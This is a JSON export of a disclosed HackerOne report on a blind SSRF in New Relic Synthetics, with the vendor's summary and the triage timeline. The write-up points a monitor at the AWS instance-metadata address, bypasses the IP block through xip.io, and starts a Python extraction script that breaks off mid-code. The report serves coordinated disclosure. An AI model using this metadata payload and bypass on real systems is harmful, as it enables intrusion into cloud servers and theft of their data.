{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-09-05T07:25:24.027Z", 
    "voters": [
        "michiel", 
        "ylujion", 
        "jon_bottarini", 
        "muhammad_uwais", 
        "omega", 
        "nicknam3", 
        "dyabla", 
        "arice", 
        "salilkapur"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 141304, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-08-26T23:32:17.972Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Blind SSRF on synthetics.newrelic.com", 
    "is_member_of_team?": null, 
    "vote_count": 9, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2572, 
            "content": "ylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. ", 
            "content_html": "<p>ylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. </p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-09-25T23:32:18.028Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "1.png", 
            "type": "image/png", 
            "id": 96303, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224921Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51c8cc4aff5ee54bf361fe1b1e6c72a1bb1300b5aef1146278c27e39917fe189"
        }, 
        {
            "file_name": "2.png", 
            "type": "image/png", 
            "id": 96304, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224921Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4ed0a9771c0cb17dde3ba021e3c94023913533e04971372f3f6dd45d66265cf"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-27T23:25:15.574Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-27T23:25:15.574Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thanks for this awesome report, ylujion ! Your thoroughness and detailed writeup is really appreciated. We'll file it with the appropriate engineering team and start working on a fix. ", 
            "markdown_message": "<p>Thanks for this awesome report, ylujion ! Your thoroughness and detailed writeup is really appreciated. We&#39;ll file it with the appropriate engineering team and start working on a fix. </p>\n", 
            "type": "Activities::Comment", 
            "id": 988534, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-31T18:30:06.668Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-31T18:30:06.668Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 993282, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-31T18:32:34.880Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-31T18:32:34.880Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi ylujion,\n\nWe're filed an issue with the development team. We'll update you here as we have additional questions and when the fix becomes available for you to re-test. \n\nThank you,\nMatthew", 
            "markdown_message": "<p>Hi ylujion,</p>\n\n<p>We&#39;re filed an issue with the development team. We&#39;ll update you here as we have additional questions and when the fix becomes available for you to re-test. </p>\n\n<p>Thank you,<br>\nMatthew</p>\n", 
            "type": "Activities::Comment", 
            "id": 993289, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-02T16:06:39.798Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-02T16:06:39.798Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi ylujion,\n\nThe team has pushed a fix for this issue and the other you reported. Can you take a look and see if the issue(s) have been resolved?\n\nThanks,\nMatthew", 
            "markdown_message": "<p>Hi ylujion,</p>\n\n<p>The team has pushed a fix for this issue and the other you reported. Can you take a look and see if the issue(s) have been resolved?</p>\n\n<p>Thanks,<br>\nMatthew</p>\n", 
            "type": "Activities::Comment", 
            "id": 996881, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-02T16:20:11.890Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-02T16:20:11.890Z", 
            "actor": {
                "username": "ylujion", 
                "url": "/ylujion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/009/8948d1662c6b4127ae83384bd8b7aaaa3db23884_medium.png?1464497328"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "I had the monitor still up, so I can tell that since yesterday I am not able to access the URL anymore.\n\nI still tried with other different service`xip.io` and `nip.io` to ensure that not only `xip.io` was blacklisted.\n\nRegards.\n", 
            "markdown_message": "<p>I had the monitor still up, so I can tell that since yesterday I am not able to access the URL anymore.</p>\n\n<p>I still tried with other different service<code>xip.io</code> and <code>nip.io</code> to ensure that not only <code>xip.io</code> was blacklisted.</p>\n\n<p>Regards.</p>\n", 
            "type": "Activities::Comment", 
            "id": 996904, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ylujion", 
                "url": "/ylujion"
            }, 
            "created_at": "2016-06-02T16:38:53.543Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-02T16:38:53.543Z", 
            "actor": {
                "username": "mlapworth", 
                "url": "/mlapworth", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/133/9e85d8632926096fed12357c0d7835402c3c06a9_medium.JPG?1437669168"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thank you for helping us keep New Relic's customers secure! I'll be closing out this report and 141682. ", 
            "markdown_message": "<p>Thank you for helping us keep New Relic&#39;s customers secure! I&#39;ll be closing out this report and 141682. </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 996928, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-26T23:32:18.005Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-26T23:32:18.005Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1157059, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-02T21:32:03.798Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-02T21:32:03.798Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "@ylujion I've added a summary and set disclosure to limited for this issue. Thanks again !", 
            "markdown_message": "<p><a href=\"/ylujion\">@ylujion</a> I&#39;ve added a summary and set disclosure to limited for this issue. Thanks again !</p>\n", 
            "type": "Activities::Comment", 
            "id": 1170655, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-05T07:25:24.086Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-05T07:25:24.086Z", 
            "actor": {
                "username": "ylujion", 
                "url": "/ylujion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/009/8948d1662c6b4127ae83384bd8b7aaaa3db23884_medium.png?1464497328"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1173085, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-05T07:25:24.226Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-05T07:25:24.226Z", 
            "actor": {
                "username": "ylujion", 
                "url": "/ylujion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/009/8948d1662c6b4127ae83384bd8b7aaaa3db23884_medium.png?1464497328"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1173086, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-05T07:55:09.852Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-05T07:55:09.852Z", 
            "actor": {
                "username": "ylujion", 
                "url": "/ylujion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/009/8948d1662c6b4127ae83384bd8b7aaaa3db23884_medium.png?1464497328"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "You could have fully disclosed this one by the way as it does not disclose any sensitive information like the other one. Maybe if it is possible to change it as it is quite interesting.", 
            "markdown_message": "<p>You could have fully disclosed this one by the way as it does not disclose any sensitive information like the other one. Maybe if it is possible to change it as it is quite interesting.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1173208, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-05T17:10:18.489Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-05T17:10:18.489Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "@ylujion fully disclosed - I didn't read closely enough and see that the details were from Amazon's docs. Thanks again, as always appreciate the help to do our best with this program ! ", 
            "markdown_message": "<p><a href=\"/ylujion\">@ylujion</a> fully disclosed - I didn&#39;t read closely enough and see that the details were from Amazon&#39;s docs. Thanks again, as always appreciate the help to do our best with this program ! </p>\n", 
            "type": "Activities::Comment", 
            "id": 1174731, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-03T03:29:45.606Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-03T03:29:45.606Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 2694233, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ylujion", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ylujion", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/009/8cfc63102c3e055f8333da05b299a112c0cac895_small.png?1464497328"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -69290223.75688049, 
    "disclosed_at": "2016-09-05T07:25:24.196Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/141304", 
    "created_at": "2016-05-26T21:34:59.173Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"introduction\">Introduction</h2>\n\n<p>It was possible to retrieve some data from the <code>http://169.254.169.254/latest/</code> URL corresponding to the <a href=\"/redirect?signature=c1fb941561244fef4ca726b095a9b090f47d4865&amp;url=http%3A%2F%2Fdocs.aws.amazon.com%2FAWSEC2%2Flatest%2FUserGuide%2Fec2-instance-metadata.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>amazon instance metadatas</span><i class=\"icon-external-link\"></i></a>. With more time, we can dump the whole content.</p>\n\n<h2 id=\"poc\">PoC</h2>\n\n<p>When creating a <code>Ping Monitor</code> on the <code>https://synthetics.newrelic.com/accounts/XXXXXXX/synthetics</code> URL, it is possible to check if a website is online and match for a string in the retrieved page.</p>\n\n<p>First I tried to create a <code>Ping Monitor</code> where the <code>Monitor URL</code> is set to <code>http://169.254.169.254/latest/dynamic/instance-identity/document</code> to see if we can access to this URL from on of the location available. For the PoC I used the <code>Dublin, IE</code> location. When trying this we get the following errors:<br>\n <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224921Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=51c8cc4aff5ee54bf361fe1b1e6c72a1bb1300b5aef1146278c27e39917fe189\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224921Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=51c8cc4aff5ee54bf361fe1b1e6c72a1bb1300b5aef1146278c27e39917fe189\" class=\"markdown-inline-image\"></a></p>\n\n<p>We are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using <a href=\"/redirect?signature=bd0e26a783c9f271317cdf6bbade93fd275cd8bf&amp;url=http%3A%2F%2Fxip.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>xip.io</span><i class=\"icon-external-link\"></i></a>. It does the following as written on the web page:</p>\n<pre class=\"highlight plaintext\"><code>What is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,\n\n          10.0.0.1.xip.io   resolves to   10.0.0.1\n      www.10.0.0.1.xip.io   resolves to   10.0.0.1\n   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1\n\n...and so on. You can use these domains to access virtual\nhosts on your development web server from devices on your\nlocal network, like iPads, iPhones, and other computers.\nNo configuration required!\n</code></pre>\n<p>So now we set our <code>Monitor URL</code> to <code>http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document</code> and the file is successfully accessed:<br>\n <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224921Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e4ed0a9771c0cb17dde3ba021e3c94023913533e04971372f3f6dd45d66265cf\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224921Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e4ed0a9771c0cb17dde3ba021e3c94023913533e04971372f3f6dd45d66265cf\" class=\"markdown-inline-image\"></a></p>\n\n<p>When looking at <a href=\"/redirect?signature=9e02650094a1e979ab0088b306f9d53c1e7dd1e4&amp;url=http%3A%2F%2Fdocs.aws.amazon.com%2FAWSEC2%2Flatest%2FUserGuide%2Finstance-identity-documents.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>amazons documentation</span><i class=\"icon-external-link\"></i></a> we know how the <code>latest/dynamic/instance-identity/document</code> file is structured:</p>\n<pre class=\"highlight plaintext\"><code>{\n  &quot;devpayProductCodes&quot; : null,\n  &quot;availabilityZone&quot; : &quot;us-east-1d&quot;,\n  &quot;privateIp&quot; : &quot;10.158.112.84&quot;,\n  &quot;version&quot; : &quot;2010-08-31&quot;,\n  &quot;region&quot; : &quot;us-east-1&quot;,\n  &quot;instanceId&quot; : &quot;i-1234567890abcdef0&quot;,\n  &quot;billingProducts&quot; : null,\n  &quot;instanceType&quot; : &quot;t1.micro&quot;,\n  &quot;accountId&quot; : &quot;123456789012&quot;,\n  &quot;pendingTime&quot; : &quot;2015-11-19T16:32:11Z&quot;,\n  &quot;imageId&quot; : &quot;ami-5fb8c835&quot;,\n  &quot;kernelId&quot; : &quot;aki-919dcaf8&quot;,\n  &quot;ramdiskId&quot; : null,\n  &quot;architecture&quot; : &quot;x86_64&quot;\n}\n</code></pre>\n<p>As a PoC, we are going to retrieve the <code>accountId</code> value from the <code>Dublin, IE</code> amazon instance. For this purpose the following <code>python</code> script was created:</p>\n<pre class=\"highlight python\"><code><span class=\"c\">#!/usr/bin/python3</span>\n<span class=\"kn\">import</span> <span class=\"nn\">requests</span>\n<span class=\"kn\">import</span> <span class=\"nn\">json</span>\n<span class=\"kn\">import</span> <span class=\"nn\">time</span>\n\n<span class=\"c\">#Charset that will be used to determine the accountId</span>\n<span class=\"n\">alpha_min</span> <span class=\"o\">=</span> <span class=\"s\">&#39;0123456789&#39;</span>\n\n<span class=\"c\">#Headers needed for some requests</span>\n<span class=\"n\">headers</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">&#39;Accept&#39;</span><span class=\"p\">:</span> <span class=\"s\">&#39;application/json&#39;</span><span class=\"p\">}</span>\n<span 